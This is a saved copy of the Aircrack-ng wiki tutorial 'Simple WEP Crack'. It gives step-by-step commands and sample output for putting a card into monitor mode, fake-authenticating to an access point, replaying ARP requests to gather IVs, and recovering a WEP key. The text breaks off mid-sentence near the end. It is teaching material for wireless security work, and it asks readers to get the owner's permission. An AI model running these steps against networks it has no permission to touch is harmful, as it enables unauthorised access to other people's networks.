<!DOCTYPE html>
<html dir="ltr" class="js desktop" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /><![endif]-->
    <title>simple_wep_crack [Aircrack-ng]</title>
    <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
    <meta name="generator" content="DokuWiki">
<meta name="robots" content="index,follow">
<meta name="date" content="2010-08-29T19:41:19+0200">
<meta name="keywords" content="simple_wep_crack">
<link rel="search" type="application/opensearchdescription+xml" href="http://www.aircrack-ng.org/lib/exe/opensearch.php" title="Aircrack-ng">
<link rel="start" href="http://www.aircrack-ng.org/">
<link rel="contents" href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack&amp;do=index" title="Sitemap">
<link rel="alternate" type="application/rss+xml" title="Recent Changes" href="http://www.aircrack-ng.org/feed.php">
<link rel="alternate" type="application/rss+xml" title="Current Namespace" href="http://www.aircrack-ng.org/feed.php?mode=list&amp;ns=">
<link rel="alternate" type="text/html" title="Plain HTML" href="http://www.aircrack-ng.org/doku.php?do=export_xhtml&amp;id=simple_wep_crack">
<link rel="alternate" type="text/plain" title="Wiki Markup" href="http://www.aircrack-ng.org/doku.php?do=export_raw&amp;id=simple_wep_crack">
<link rel="canonical" href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack">
<link rel="stylesheet" type="text/css" href="simple_wep_crack%20%5BAircrack-ng%5D_files/css.css">
<script type="text/javascript">/*<![CDATA[*/var NS='';var JSINFO = {"id":"simple_wep_crack","namespace":""};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="simple_wep_crack%20%5BAircrack-ng%5D_files/js.php"></script>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="shortcut icon" href="http://www.aircrack-ng.org/lib/tpl/dokuwiki/images/favicon.ico">
<link rel="apple-touch-icon" href="http://www.aircrack-ng.org/lib/tpl/dokuwiki/images/apple-touch-icon.png">
    <script>try {  for(var lastpass_iter=0; lastpass_iter < document.forms.length; lastpass_iter++){    var lastpass_f = document.forms[lastpass_iter];    if(typeof(lastpass_f.lpsubmitorig)=="undefined"){      if (typeof(lastpass_f.submit) == "function") {        lastpass_f.lpsubmitorig = lastpass_f.submit;        lastpass_f.submit = function(){          var form = this;          try {            if (document.documentElement && 'createEvent' in document)            {              var forms = document.getElementsByTagName('form');              for (var i=0 ; i<forms.length ; ++i)                if (forms[i]==form)                {                  var element = document.createElement('lpformsubmitdataelement');                  element.setAttribute('formnum',i);                  element.setAttribute('from','submithook');                  document.documentElement.appendChild(element);                  var evt = document.createEvent('Events');                  evt.initEvent('lpformsubmit',true,false);                  element.dispatchEvent(evt);                  break;                }            }          } catch (e) {}          try {            form.lpsubmitorig();          } catch (e) {}        }      }    }  }} catch (e) {}</script></head>

<body>
    <!--[if lte IE 7 ]><div id="IE7"><![endif]--><!--[if IE 8 ]><div id="IE8"><![endif]-->
    <div id="dokuwiki__site"><div id="dokuwiki__top" class="dokuwiki site mode_show  ">

        
<!-- ********** HEADER ********** -->
<div id="dokuwiki__header"><div class="pad group">

    
    <div class="headings group">
        <ul class="a11y skip">
            <li><a href="#dokuwiki__content">skip to content</a></li>
        </ul>

        <h1><a href="http://www.aircrack-ng.org/doku.php?id=Main" accesskey="h" title="[H]"><img src="simple_wep_crack%20%5BAircrack-ng%5D_files/logo.png" alt="" height="64" width="64"> <span>Aircrack-ng</span></a></h1>
            </div>

    <div class="tools group">
        <!-- USER TOOLS -->
                    <div id="dokuwiki__usertools">
                <h3 class="a11y">User Tools</h3>
                <ul>
                    <li><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack&amp;do=login&amp;sectok=77fca2a169742d32f52f2fba05350643" class="action login" rel="nofollow" title="Login">Login</a></li>                </ul>
            </div>
        
        <!-- SITE TOOLS -->
        <div id="dokuwiki__sitetools">
            <h3 class="a11y">Site Tools</h3>
            <form action="/doku.php?id=Main" accept-charset="utf-8" class="search" id="dw__search" method="get"><div class="no"><input name="do" value="search" type="hidden"><input id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" type="text"><input value="Search" class="button" title="Search" type="submit"><div style="display: none;" id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>            <div class="mobileTools">
                <form action="doku.php" method="post" accept-charset="utf-8"><div class="no"><input name="id" value="simple_wep_crack" type="hidden"><input name="sectok" value="77fca2a169742d32f52f2fba05350643" type="hidden"><select name="do" class="edit quickselect" title="Tools"><option selected="selected" value="">Tools</option><optgroup label="Page Tools"><option value="edit">Show pagesource</option><option value="revisions">Old revisions</option><option value="backlink">Backlinks</option></optgroup><optgroup label="Site Tools"><option value="recent">Recent changes</option><option value="media">Media Manager</option><option value="index">Sitemap</option></optgroup><optgroup label="User Tools"><option value="login">Login</option></optgroup></select><input style="display: none;" value="&gt;" type="submit"></div></form>            </div>
            <ul>
                <li><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack&amp;do=recent" class="action recent" accesskey="r" rel="nofollow" title="Recent changes [R]">Recent changes</a></li><li><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack&amp;do=media" class="action media" rel="nofollow" title="Media Manager">Media Manager</a></li><li><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack&amp;do=index" class="action index" accesskey="x" rel="nofollow" title="Sitemap [X]">Sitemap</a></li>            </ul>
        </div>

    </div>

    <!-- BREADCRUMBS -->
            <div class="breadcrumbs">
                                        <div class="trace"><span class="bchead">Trace:</span> <span class="bcsep">•</span> <a href="http://www.aircrack-ng.org/doku.php?id=getting_started" class="breadcrumbs" title="getting_started">getting_started</a> <span class="bcsep">•</span> <a href="http://www.aircrack-ng.org/doku.php?id=compatible_cards" class="breadcrumbs" title="compatible_cards">compatible_cards</a> <span class="bcsep">•</span> <span class="curid"><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack" class="breadcrumbs" title="simple_wep_crack">simple_wep_crack</a></span></div>
                    </div>
    
    
    <hr class="a11y">
</div></div><!-- /header -->

        <div class="wrapper group">

            
            <!-- ********** CONTENT ********** -->
            <div id="dokuwiki__content"><div class="pad group">

                <div class="pageId"><span>simple_wep_crack</span></div>

                <div class="page group">
                                                            <!-- wikipage start -->
                    <!-- TOC START -->
<div id="dw__toc">
<h3 style="cursor: pointer;" class="toggle open"><strong><span>−</span></strong>Table of Contents</h3>
<div style="">

<ul class="toc">
<li class="level1"><div class="li"><a href="#tutorialsimple_wep_crack">Tutorial: Simple WEP Crack</a></div>
<ul class="toc">
<li class="level2"><div class="li"><a href="#introduction">Introduction</a></div></li>
<li class="level2"><div class="li"><a href="#assumptions">Assumptions</a></div></li>
<li class="level2"><div class="li"><a href="#equipment_used">Equipment used</a></div></li>
<li class="level2"><div class="li"><a href="#solution">Solution</a></div>
<ul class="toc">
<li class="level3"><div class="li"><a href="#solution_overview">Solution Overview</a></div></li>
<li class="level3"><div class="li"><a href="#step_1_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel">Step 1 - Start the wireless interface in monitor mode on AP channel</a></div></li>
<li class="level3"><div class="li"><a href="#step_2_-_test_wireless_device_packet_injection">Step 2 - Test Wireless Device Packet Injection</a></div></li>
<li class="level3"><div class="li"><a href="#step_3_-_start_airodump-ng_to_capture_the_ivs">Step 3 - Start airodump-ng to capture the IVs</a></div></li>
<li class="level3"><div class="li"><a href="#step_4_-_use_aireplay-ng_to_do_a_fake_authentication_with_the_access_point">Step 4 - Use aireplay-ng to do a fake authentication with the access point</a></div></li>
<li class="level3"><div class="li"><a href="#step_5_-_start_aireplay-ng_in_arp_request_replay_mode">Step 5 -  Start aireplay-ng in ARP request replay mode</a></div></li>
<li class="level3"><div class="li"><a href="#step_6_-_run_aircrack-ng_to_obtain_the_wep_key">Step 6 - Run aircrack-ng to obtain the WEP key</a></div></li>
</ul>
</li>
<li class="level2"><div class="li"><a href="#general_troubleshooting">General Troubleshooting</a></div></li>
<li class="level2"><div class="li"><a href="#generating_arps">Generating ARPs</a></div></li>
</ul></li>
</ul>
</div>
</div>
<!-- TOC END -->

<h1 class="sectionedit1" id="tutorialsimple_wep_crack">Tutorial: Simple WEP Crack</h1>
<div class="level1">

<p>
Version: 1.20 January 11, 2010<br>

By: darkAudax
</p>

</div>

<h2 class="sectionedit2" id="introduction">Introduction</h2>
<div class="level2">

<p>
This tutorial walks you though a very simple case to crack a WEP key.  
It is intended to build your basic skills and get you familiar with the 
concepts.  It assumes you have a working wireless card with drivers 
already patched for injection.
</p>

<p>
The basic concept behind this tutorial is using aireplay-ng replay an 
ARP packet to generate new unique IVs.  In turn, aircrack-ng uses the 
new unique IVs to crack the WEP key.  It is important to understand what
 an ARP packet is.  This <a href="http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection#what_is_arp" class="wikilink1" title="arp-request_reinjection">"What is an ARP?"</a> section provides the details.
</p>

<p>
For a start to finish newbie guide, see the <a href="http://www.aircrack-ng.org/doku.php?id=newbie_guide" class="wikilink1" title="newbie_guide">Linux Newbie Guide</a>.
  Although this tutorial does not cover all the steps, it does attempt 
to provide much more detailed examples of the steps to actually crack a 
WEP key plus explain the reason and background of each step.  For more 
information on installing aircrck-ng, see <a href="http://www.aircrack-ng.org/doku.php?id=install_aircrack" class="wikilink1" title="install_aircrack">Installing Aircrack-ng</a> and for installing drivers see <a href="http://www.aircrack-ng.org/doku.php?id=install_drivers" class="wikilink1" title="install_drivers">Installing Drivers</a>.
</p>

<p>
It is recommended that you experiment with your home wireless access 
point to get familiar with these ideas and techniques. If you do not own
 a particular access point, please remember to get permission from the 
owner prior to playing with it.
</p>

<p>
I would like to acknowledge and thank the <a href="http://trac.aircrack-ng.org/wiki/Team" class="urlextern" title="http://trac.aircrack-ng.org/wiki/Team" rel="nofollow">Aircrack-ng team</a> for producing such a great robust tool. 
</p>

<p>
Please send me any constructive feedback, positive or negative. 
Additional troubleshooting ideas and tips are especially welcome.
</p>

</div>

<h2 class="sectionedit3" id="assumptions">Assumptions</h2>
<div class="level2">

<p>
First, this solution assumes:
</p>
<ul>
<li class="level1"><div class="li"> You are using drivers patched for injection. Use the <a href="http://www.aircrack-ng.org/doku.php?id=injection_test" class="wikilink1" title="injection_test">injection test</a> to confirm your card can inject prior to proceeding.</div>
</li>
<li class="level1"><div class="li"> You are physically close enough to 
send and receive access point packets.  Remember that just because you 
can receive packets from the access point does not mean you may will be 
able to transmit packets to the AP.  The wireless card strength is 
typically less then the AP strength.  So you have to be physically close
 enough for your transmitted packets to reach and be received by the AP.
  You should confirm that you can communicate with the specific AP by 
following <a href="http://www.aircrack-ng.org/doku.php?id=injection_test#hidden_or_specific_ssid" class="wikilink1" title="injection_test">these instructions</a>.</div>
</li>
<li class="level1"><div class="li"> There is at least one wired or 
wireless client connected to the network and they are active.  The 
reason is that this tutorial depends on receiving at least one ARP 
request packet and if there are no active clients then there will never 
be any ARP request packets.</div>
</li>
<li class="level1"><div class="li"> You are using v0.9 of aircrack-ng. If you use a different version then some of the common options may have to be changed.</div>
</li>
</ul>

<p>
Ensure all of the above assumptions are true, otherwise the advice that 
follows will not work.  In the examples below, you will need to change 
“ath0” to the interface name which is specific to your wireless card.
</p>

</div>

<h2 class="sectionedit4" id="equipment_used">Equipment used</h2>
<div class="level2">

<p>
In this tutorial, here is what was used:
</p>
<ul>
<li class="level1"><div class="li">MAC address of PC running aircrack-ng suite: 00:0F:B5:88:AC:82</div>
</li>
<li class="level1"><div class="li">BSSID (MAC address of access point): 00:14:6C:7E:40:80</div>
</li>
<li class="level1"><div class="li">ESSID (Wireless network name): teddy</div>
</li>
<li class="level1"><div class="li">Access point channel: 9</div>
</li>
<li class="level1"><div class="li">Wireless interface: ath0</div>
</li>
</ul>

<p>
You should gather the equivalent information for the network you will be
 working on.  Then just change the values in the examples below to the 
specific network.
</p>

</div>

<h2 class="sectionedit5" id="solution">Solution</h2>
<div class="level2">

</div>

<h3 class="sectionedit6" id="solution_overview">Solution Overview</h3>
<div class="level3">

<p>
To crack the WEP key for an access point, we need to gather lots of 
initialization vectors (IVs).  Normal network traffic does not typically
 generate these IVs very quickly.  Theoretically, if you are patient, 
you can gather sufficient IVs to crack the WEP key by simply listening 
to the network traffic and saving them.  Since none of us are patient, 
we use a technique called injection to speed up the process.  Injection 
involves having the access point (AP) resend selected packets over and 
over very rapidly.  This allows us to capture a large number of IVs in a
 short period of time.
</p>

<p>
Once we have captured a large number of IVs, we can use them to determine the WEP key.
</p>

<p>
Here are the basic steps we will be going through:
</p>
<ol>
<li class="level1"><div class="li"> Start the wireless interface in monitor mode on the specific AP channel</div>
</li>
<li class="level1"><div class="li"> Test the injection capability of the wireless device to the AP</div>
</li>
<li class="level1"><div class="li"> Use aireplay-ng to do a fake authentication with the access point</div>
</li>
<li class="level1"><div class="li"> Start airodump-ng on AP channel with a bssid filter to collect the new unique IVs</div>
</li>
<li class="level1"><div class="li"> Start aireplay-ng in ARP request replay mode to inject packets</div>
</li>
<li class="level1"><div class="li"> Run aircrack-ng to crack key using the IVs collected</div>
</li>
</ol>

</div>

<h3 class="sectionedit7" id="step_1_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel">Step 1 - Start the wireless interface in monitor mode on AP channel</h3>
<div class="level3">

<p>
The purpose of this step is to put your card into what is called monitor
 mode.  Monitor mode is mode whereby your card can listen to every 
packet in the air.  Normally your card will only “hear” packets 
addressed to you.  By hearing every packet, we can later select some for
 injection.  As well, only (there are some rare exceptions) monitor mode
 allows you to inject packets. (Note: this procedure is different for 
non-Atheros cards.)
</p>

<p>
First stop ath0 by entering:
</p>
<pre class="code"> airmon-ng stop ath0   </pre>

<p>
The system responds:
</p>
<pre class="code"> Interface       Chipset         Driver
 
 wifi0           Atheros         madwifi-ng
 ath0            Atheros         madwifi-ng VAP (parent: wifi0) (VAP destroyed)</pre>

<p>
Enter “iwconfig” to ensure there are no other athX interfaces.  It should look similar to this:
</p>
<pre class="code"> lo        no wireless extensions.
 
 eth0      no wireless extensions.
 
 wifi0     no wireless extensions.</pre>

<p>
If there are any remaining athX interfaces,  then stop each one.  When 
you are finished, run “iwconfig” to ensure there are none left.
</p>

<p>
Now, enter the following command to start the wireless card on channel 9 in monitor mode:
</p>
<pre class="code"> airmon-ng start wifi0 9</pre>

<p>
Substitute the channel number that your AP runs on for “9” in the 
command above.  This is important.  You must have your wireless card 
locked to the AP channel for the following steps in this tutorial to 
work correctly.
</p>

<p>
Note: In this command we use “wifi0” instead of our wireless interface 
of “ath0”.  This is because the madwifi-ng drivers are being used.  For 
other drivers, use the wireless interface name.  Examples: “wlan0” or 
“rausb0”.
</p>

<p>
The system will respond:
</p>
<pre class="code"> Interface       Chipset         Driver
 
 wifi0           Atheros         madwifi-ng
 ath0            Atheros         madwifi-ng VAP (parent: wifi0) (monitor mode enabled)</pre>

<p>
You will notice that “ath0” is reported above as being put into monitor mode.
</p>

<p>
To confirm the interface is properly setup, enter “iwconfig”.
</p>

<p>
The system will respond:
</p>
<pre class="code"> lo        no wireless extensions.
 
 wifi0     no wireless extensions.
 
 eth0      no wireless extensions.
 
 ath0      IEEE 802.11g  ESSID:""  Nickname:""
        Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82   
        Bit Rate:0 kb/s   Tx-Power:18 dBm   Sensitivity=0/3  
        Retry:off   RTS thr:off   Fragment thr:off
        Encryption key:off
        Power Management:off
        Link Quality=0/94  Signal level=-95 dBm  Noise level=-95 dBm
        Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
        Tx excessive retries:0  Invalid misc:0   Missed beacon:0</pre>

<p>
In the response above, you can see that ath0 is in monitor mode, on the 
2.452GHz frequency which is channel 9 and the Access Point shows the MAC
 address of your wireless card.  Please note that only the madwifi-ng 
drivers show the MAC address of your wireless card, the other drivers do
 not do this.  So everything is good. It is important to confirm all 
this information prior to proceeding, otherwise the following steps will
 not work properly.
</p>

<p>
To match the frequency to the channel, check out:
<a href="http://www.cisco.com/en/US/docs/wireless/technology/channel/deployment/guide/Channel.html#wp134132" class="urlextern" title="http://www.cisco.com/en/US/docs/wireless/technology/channel/deployment/guide/Channel.html#wp134132" rel="nofollow">http://www.cisco.com/en/US/docs/wireless/technology/channel/deployment/guide/Channel.html#wp134132</a> .  This will give you the frequency for each channel.
</p>

</div>

<h3 class="sectionedit8" id="step_2_-_test_wireless_device_packet_injection">Step 2 - Test Wireless Device Packet Injection</h3>
<div class="level3">

<p>
The purpose of this step ensures that your card is within distance of your AP and can inject packets to it.
</p>

<p>
Enter:
</p>
<pre class="code"> aireplay-ng -9 -e teddy -a 00:14:6C:7E:40:80  ath0</pre>

<p>
Where:
</p>
<ul>
<li class="level1"><div class="li">-9 means injection test</div>
</li>
<li class="level1"><div class="li">-e teddy is the wireless network name</div>
</li>
<li class="level1"><div class="li">-a 00:14:6C:7E:40:80 is the access point MAC address</div>
</li>
<li class="level1"><div class="li">ath0 is the wireless interface name</div>
</li>
</ul>

<p>
The system should respond with:
</p>
<pre class="code"> 09:23:35  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
 09:23:35  Trying broadcast probe requests...
 09:23:35  Injection is working!
 09:23:37  Found 1 AP 
 
 09:23:37  Trying directed probe requests...
 09:23:37  00:14:6C:7E:40:80 - channel: 9 - 'teddy'
 09:23:39  Ping (min/avg/max): 1.827ms/68.145ms/111.610ms Power: 33.73
 09:23:39  30/30: 100%</pre>

<p>
The last line is important.  Ideally it should say 100% or a very high 
percentage.  If it is low then you are too far away from the AP or too 
close.  If it is zero then injection is not working and you need to 
patch your drivers or use different drivers.
</p>

<p>
See the <a href="http://www.aircrack-ng.org/doku.php?id=injection_test" class="wikilink1" title="injection_test">injection test</a> for more details.
</p>

</div>

<h3 class="sectionedit9" id="step_3_-_start_airodump-ng_to_capture_the_ivs">Step 3 - Start airodump-ng to capture the IVs</h3>
<div class="level3">

<p>
The purpose of this step is to capture the IVs generated.  This step 
starts airodump-ng to capture the IVs from the specific access point.
</p>

<p>
Open another console session to capture the generated IVs.  Then enter:
</p>
<pre class="code"> airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output ath0</pre>

<p>
Where:
</p>
<ul>
<li class="level1"><div class="li">-c 9 is the channel for the wireless network</div>
</li>
<li class="level1"><div class="li">-<code></code>-bssid 00:14:6C:7E:40:80 is the access point MAC address.  This eliminate extraneous traffic.</div>
</li>
<li class="level1"><div class="li">-w capture is file name prefix for the file which will contain the IVs.</div>
</li>
<li class="level1"><div class="li">ath0 is the interface name.</div>
</li>
</ul>

<p>
While the injection is taking place (later), the screen will look similar to this:
</p>
<pre class="code"> CH  9 ][ Elapsed: 8 mins ][ 2007-03-21 19:25 
                                                                                                              
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
                                                                                                            
 00:14:6C:7E:40:80   42 100     5240   178307  338   9  54  WEP  WEP         teddy                           
                                                                                                            
 BSSID              STATION            PWR  Lost  Packets  Probes                                             
                                                                                                            
 00:14:6C:7E:40:80  00:0F:B5:88:AC:82   42     0   183782  </pre>

</div>

<h3 class="sectionedit10" id="step_4_-_use_aireplay-ng_to_do_a_fake_authentication_with_the_access_point">Step 4 - Use aireplay-ng to do a fake authentication with the access point</h3>
<div class="level3">

<p>
In order for an access point to accept a packet, the source MAC address 
must already be associated.  If the source MAC address you are injecting
 is not associated then the AP ignores the packet and sends out a 
“DeAuthentication” packet in cleartext.  In this state, no new IVs are 
created because the AP is ignoring all the injected packets.
</p>

<p>
The lack of association with the access point is the single biggest 
reason why injection fails.  Remember the golden rule:  The MAC you use 
for injection must be associated with the AP by either using fake 
authentication or using a MAC from an already-associated client.
</p>

<p>
To associate with an access point, use fake authentication:
</p>
<pre class="code"> aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0</pre>

<p>
Where:
</p>
<ul>
<li class="level1"><div class="li">-1 means fake authentication</div>
</li>
<li class="level1"><div class="li">0 reassociation timing in seconds</div>
</li>
<li class="level1"><div class="li">-e teddy is the wireless network name</div>
</li>
<li class="level1"><div class="li">-a 00:14:6C:7E:40:80 is the access point MAC address</div>
</li>
<li class="level1"><div class="li">-h 00:0F:B5:88:AC:82 is our card MAC address</div>
</li>
<li class="level1"><div class="li">ath0 is the wireless interface name</div>
</li>
</ul>

<p>
Success looks like:
</p>
<pre class="code">18:18:20  Sending Authentication Request
18:18:20  Authentication successful
18:18:20  Sending Association Request
18:18:20  Association successful :-)</pre>

<p>
Or another variation for picky access points:
</p>
<pre class="code">aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0</pre>

<p>
Where:
</p>
<ul>
<li class="level1"><div class="li"> 6000 - Reauthenticate every 6000 seconds.  The long period also causes keep alive packets to be sent.</div>
</li>
<li class="level1"><div class="li"> -o 1 - Send only one set of packets at a time.  Default is multiple and this confuses some APs.</div>
</li>
<li class="level1"><div class="li"> -q 10 - Send keep alive packets every 10 seconds.</div>
</li>
</ul>

<p>
Success looks like:
</p>
<pre class="code">18:22:32  Sending Authentication Request
18:22:32  Authentication successful
18:22:32  Sending Association Request
18:22:32  Association successful :-)
18:22:42  Sending keep-alive packet
18:22:52  Sending keep-alive packet
# and so on.</pre>

<p>
Here is an example of what a failed authentication looks like:
</p>
<pre class="code">8:28:02  Sending Authentication Request
18:28:02  Authentication successful
18:28:02  Sending Association Request
18:28:02  Association successful :-)
18:28:02  Got a deauthentication packet!
18:28:05  Sending Authentication Request
18:28:05  Authentication successful
18:28:05  Sending Association Request
18:28:10  Sending Authentication Request
18:28:10  Authentication successful
18:28:10  Sending Association Request</pre>

<p>
Notice the “Got a deauthentication packet” and the continuous retries 
above.  Do not proceed to the next step until you have the fake 
authentication running correctly.
</p>

</div>

<h4 id="troubleshooting_tips">Troubleshooting Tips</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li">Some access points are configured to 
only allow selected MAC addresses to associate and connect.  If this is 
the case, you will not be able to successfully do fake authentication 
unless you know one of the MAC addresses on the allowed list.  If you 
suspect this is the problem, use the following command while trying to 
do fake authentication.  Start another session and…</div>
</li>
</ul>

<p>
Run: tcpdump -n -vvv -s0 -e -i &lt;interface name&gt; | grep -i -E ”(RA:&lt;MAC address of your card&gt;|Authentication|ssoc)”
</p>

<p>
You would then look for error messages.
</p>
<ul>
<li class="level1"><div class="li">If at any time you wish to confirm 
you are properly associated is to use tcpdump and look at the packets.  
Start another session and…</div>
</li>
</ul>

<p>
Run: “tcpdump -n -e -s0 -vvv -i ath0”
</p>

<p>
Here is a typical tcpdump error message you are looking for:
</p>
<pre class="code"> 11:04:34.360700 314us BSSID:00:14:6c:7e:40:80 DA:00:0F:B5:88:AC:82 SA:00:14:6c:7e:40:80   DeAuthentication: Class 3 frame received from nonassociated station</pre>

<p>
Notice that the access point (00:14:6c:7e:40:80) is telling the source 
(00:0F:B5:88:AC:82) you are not associated.  Meaning, the AP will not 
process or accept the injected packets.
</p>

<p>
If you want to select only the DeAuth packets with tcpdump then you can 
use: “tcpdump -n -e -s0 -vvv -i ath0 | grep -i DeAuth”.  You may need to
 tweak the phrase “DeAuth” to pick out the exact packets you want.
</p>

</div>

<h3 class="sectionedit11" id="step_5_-_start_aireplay-ng_in_arp_request_replay_mode">Step 5 -  Start aireplay-ng in ARP request replay mode</h3>
<div class="level3">

<p>
The purpose of this step is to start aireplay-ng in a mode which listens
 for ARP requests then reinjects them back into the network.   For an 
explanation of ARP, see this <a href="http://www.pcmag.com/encyclopedia_term/0,2542,t=ARP&amp;i=37988,00.asp" class="urlextern" title="http://www.pcmag.com/encyclopedia_term/0,2542,t=ARP&amp;i=37988,00.asp" rel="nofollow">PC Magazine page</a> or <a href="http://en.wikipedia.org/wiki/Address_Resolution_Protocol" class="urlextern" title="http://en.wikipedia.org/wiki/Address_Resolution_Protocol" rel="nofollow">Wikipedia</a>.
  The reason we select ARP request packets is because the AP will 
normally rebroadcast them and generate a new IV.  Again, this is our 
objective, to obtain a large number of IVs in a short period of time.
</p>

<p>
Open another console session and enter:
</p>
<pre class="code"> aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0</pre>

<p>
It will start listening for ARP requests and when it hears one, aireplay-ng will immediately start to inject it.  See the <span class="curid"><a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack#generating_arps" class="wikilink1" title="simple_wep_crack">Generating ARPs</a></span> section for tricks on generating ARPs if your screen says “got 0 ARP requests” after waiting a long time.
</p>

<p>
Here is what the screen looks like when ARP requests are being injected:
</p>
<pre class="code"> Saving ARP requests in replay_arp-0321-191525.cap
 You should also start airodump-ng to capture replies.
 Read 629399 packets (got 316283 ARP requests), sent 210955 packets...</pre>

<p>
You can confirm that you are injecting by checking your airodump-ng 
screen.  The data packets should be increasing rapidly.  The ”#/s” 
should be a decent number.  However, decent depends on a large variety 
of factors.  A typical range is 300 to 400 data packets per second.  It 
can as low as a 100/second and as high as a 500/second.
</p>

</div>

<h4 id="troubleshooting_tips1">Troubleshooting Tips</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li"> If you receive a message similar to 
“Got a deauth/disassoc packet. Is the source mac associated?”, this 
means you have lost association with the AP.  All your injected packets 
will be ignored.  You must return to the fake authentication step (Step 
3) and successfully associate with the AP.</div>
</li>
</ul>

</div>

<h3 class="sectionedit12" id="step_6_-_run_aircrack-ng_to_obtain_the_wep_key">Step 6 - Run aircrack-ng to obtain the WEP key</h3>
<div class="level3">

<p>
The purpose of this step is to obtain the WEP key from the IVs gathered in the previous steps.
</p>

<p>
Note: For learning purposes, you should use a 64 bit WEP key on your AP 
to speed up the cracking process.  If this is the case, then you can 
include ”-n 64” to limit the checking of keys to 64 bits.
</p>

<p>
Two methods will be shown.  It is recommended you try both for learning 
purposes.  By trying both methods, you will see quickly the PTW method 
successfully determines the WEP key compared to the FMS/Korek method.  
As a reminder, the PTW method only works successfully with arp 
request/reply packets.  Since this tutorial covers injection of ARP 
request packets, you can properly use this method.  The other 
requirement is that you capture the full packet with airodump-ng.  
Meaning, do not use the ”-<code></code>-ivs” option.
</p>

<p>
Start another console session and enter:
</p>
<pre class="code"> aircrack-ng -b 00:14:6C:7E:40:80 output*.cap</pre>

<p>
Where:
</p>
<ul>
<li class="level1"><div class="li"> -b 00:14:6C:7E:40:80 selects the one
 access point we are interested in.  This is optional since when we 
originally captured the data, we applied a filter to only capture data 
for this one AP.</div>
</li>
<li class="level1"><div class="li"> output*.cap selects all files starting with “output” and ending in ”.cap”.</div>
</li>
</ul>

<p>
To also use the FMS/Korek method, start another console session and enter:
</p>
<pre class="code"> aircrack-ng -K -b 00:14:6C:7E:40:80 output*.cap</pre>

<p>
Where:
</p>
<ul>
<li class="level1"><div class="li"> -K invokes the FMS/Korek method</div>
</li>
<li class="level1"><div class="li"> -b 00:14:6C:7E:40:80 selects the one
 access point we are interested in.  This is optional since when we 
originally captured the data, we applied a filter to only capture data 
for this one AP.</div>
</li>
<li class="level1"><div class="li"> output*.cap selects all files starting with “output” and ending in ”.cap”.</div>
</li>
</ul>

<p>
If you are using 1.0-rc1, add the option ”-K” for the FMS/KoreK attack. (1.0-rc1 defaults to PTW.)
</p>

<p>
You can run this while generating packets.  In a short time, the WEP key
 will be calculated and presented.  You will need approximately 250,000 
IVs for 64 bit and 1,500,000 IVs for 128 bit keys.  If you are using the
 PTW attack, then you will need about 20,000 packets for 64-bit and 
40,000 to 85,000 packets for 128 bit. These are very approximate and 
there are many variables as to how many IVs you actually need to crack 
the WEP key.
</p>

<p>
Here is what success looks like:
</p>
<pre class="code">                                              Aircrack-ng 0.9
 
 
                              [00:03:06] Tested 674449 keys (got 96610 IVs)
 
 KB    depth   byte(vote)
  0    0/  9   12(  15) F9(  15) 47(  12) F7(  12) FE(  12) 1B(   5) 77(   5) A5(   3) F6(   3) 03(   0) 
  1    0/  8   34(  61) E8(  27) E0(  24) 06(  18) 3B(  16) 4E(  15) E1(  15) 2D(  13) 89(  12) E4(  12) 
  2    0/  2   56(  87) A6(  63) 15(  17) 02(  15) 6B(  15) E0(  15) AB(  13) 0E(  10) 17(  10) 27(  10) 
  3    1/  5   78(  43) 1A(  20) 9B(  20) 4B(  17) 4A(  16) 2B(  15) 4D(  15) 58(  15) 6A(  15) 7C(  15) 
 
                       KEY FOUND! [ 12:34:56:78:90 ] 
      Probability: 100%</pre>

<p>
Notice that in this case it took far less then the estimated 250,000 IVs
 to crack the key. (For this example, the FMS/KoreK attack was used.)
</p>

</div>

<h2 class="sectionedit13" id="general_troubleshooting">General Troubleshooting</h2>
<div class="level2">
<ul>
<li class="level1"><div class="li"> Be sure to read all the documentation on the Wiki for the various commands used in this tutorial.</div>
</li>
<li class="level1"><div class="li"> See <a href="http://www.aircrack-ng.org/doku.php?id=i_am_injecting_but_the_ivs_don_t_increase" class="wikilink1" title="i_am_injecting_but_the_ivs_don_t_increase">Tutorial: I am injecting but the IVs don't increase</a></div>
</li>
</ul>

</div>

<h2 class="sectionedit14" id="generating_arps">Generating ARPs</h2>
<div class="level2">

<p>
In order for this tutorial to work, you must receive at least one ARP 
packet.  On your home network, here is an easy way to generate an ARP 
packet.  On a wired or wireless PC, ping a non-existent IP on your home <abbr title="Local Area Network">LAN</abbr>.  A wired PC means a PC connected to your <abbr title="Local Area Network">LAN</abbr> via an ethernet cable.  Lets say your home <abbr title="Local Area Network">LAN</abbr>
  address space is 192.168.1.1 through 192.168.1.254.  Pick an IP 
between 1 and 254 which is not assigned to a network device.  For 
example, if the IP 192.168.1.213 is not being used then “ping 
